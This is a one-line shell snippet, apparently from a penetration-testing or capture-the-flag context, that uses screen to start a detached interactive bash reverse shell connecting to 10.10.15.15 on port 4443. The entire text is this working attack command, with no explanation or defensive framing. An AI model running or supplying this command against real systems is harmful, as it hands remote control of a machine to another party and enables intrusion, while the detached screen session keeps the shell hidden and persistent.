```sh
screen -dm bash -c '/bin/bash -i >& /dev/tcp/10.10.15.15/4443 0>&1'
```